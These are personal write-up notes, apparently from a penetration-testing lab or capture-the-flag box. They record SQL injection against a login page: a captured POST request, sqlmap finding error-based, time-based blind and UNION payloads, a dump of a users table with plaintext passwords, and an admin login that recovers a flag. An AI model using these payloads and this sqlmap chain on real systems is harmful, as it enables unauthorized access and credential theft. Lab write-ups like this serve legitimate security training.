Login page for `kaleb`
![[Pasted image 20250308074529.png]]
going to try `SQL Injection` with the post request with `test:test` credentials
![[Pasted image 20250308074652.png]]
`Post Request`
```http
POST /login.php HTTP/1.1
Host: 192.168.66.86
Content-Length: 27
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.66.86
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.66.86/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6e10d3ee676e160c6fc874489c9e8a94
Connection: keep-alive


username=test&password=test
```
`sqlmap` doesn't seem to be working right now, testing `manually`  with `concat('a','b')` to identify that the database being used is `MySQL`
![[Pasted image 20250308075114.png]]
vulnerable to `SQL Injection` with `MySQL`, just need to point out the `inject` point of username

```bash
sqlmap -r login_post.txt -p username --dbms=MySQL --batch --risk=1 --level=3 --flush-session

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1119 HTTP(s) requests:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=test2' AND GTID_SUBSET(CONCAT(0x71786b6a71,(SELECT (ELT(9208=9208,1))),0x71766b7671),9208)-- lcHi&password=test2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test2' AND (SELECT 5646 FROM (SELECT(SLEEP(5)))aHFp)-- wFeT&password=test2

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=test2' UNION ALL SELECT NULL,CONCAT(0x71786b6a71,0x4d787a4f4a66486a4c557a7844737841665a55556d68435254624c6a765a766a53545869524f4e59,0x71766b7671),NULL-- -&password=test2
---
```
![[Pasted image 20250308075600.png]]
`username` is vulnerable to `error-based, timebased blind, and UNION queries`
![[Pasted image 20250308075542.png]]
pulling the `database` names with `sqlmap -r login_post.txt -p username --dbs --batch `
![[Pasted image 20250308075847.png]]
checking out the `starfires` databases tables with `sqlmap -r login_post.txt -p username -D starfires --tables --batch`
![[Pasted image 20250308080013.png]]
two tables identified, checking out users `table` for columns with `sqlmap -r login_post.txt -p username -D starfires -T users --columns --batch`
![[Pasted image 20250308080124.png]]
dumping the `users` table for credentials `sqlmap -r login_post.txt -p username -D starfires -T users --dump --batch `

```bash
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | hsuiaushdhaksjia99 | kaleb    |
| 2  | sdjsikjdhhdha^21   | admin    |
+----+--------------------+----------+
[13:01:58] [INFO] table 'starfires.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.66.86/dump/starfires/users.csv'                                                       
[13:01:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.66.86'                                                                                   
[13:01:58] [WARNING] your sqlmap version is outdated     
```

![[Pasted image 20250308080252.png]]
able to login with `admin`
![[Pasted image 20250308080427.png]]local.txt `local.txt - 43cba3ff7c76cbede35894ab3be95b64`
![[Pasted image 20250308080444.png]]